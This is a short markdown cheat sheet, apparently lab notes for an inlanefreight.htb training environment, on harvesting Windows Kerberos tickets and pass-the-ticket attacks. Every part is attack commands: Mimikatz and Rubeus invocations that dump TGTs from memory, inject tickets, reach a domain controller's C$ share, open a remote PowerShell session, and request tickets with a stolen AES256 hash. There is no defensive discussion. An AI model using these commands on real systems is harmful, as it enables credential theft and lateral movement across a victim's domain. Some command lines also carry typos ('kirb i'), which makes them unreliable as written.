# Harvesting (TGT) Kerberos Tickets from windows 
#dumpkerberosticket
#### Mimikatz 
```
mimikatz.exe "sekurlsa::tickets /export" exit
```
#### Rubeus.exe 
```
Rubeus.exe dump /nowrap
```

# Pass the ticket 
#### Rubeus  
```
Rubeus.exe ptt /ticket:file_name.kirbi
```
```
Rubeus.exe ptt /ticket:<base64_ticket>
```
```
type \\DC01.inlanefreight.htb\C$\john\john.txt
```
#### Mimikatz 
```
mimikatz.exe "kerberos:ptt file_path.kirb i" exit
```
```
dir \\DC01.inlanefreight.htb\c$
```
# Pass the ticket (connect remotely) 
```
mimikatz.exe "kerberos:ptt file_path.kirbi" exit
```
```
powershell -c 'Enter-PSSession -ComputerName DC01'
```
```
whoami
```
#### Create a sacrificial process 
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

- In the new windows (pass-the-ticket lateral movement) 
```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<hash> /ptt
```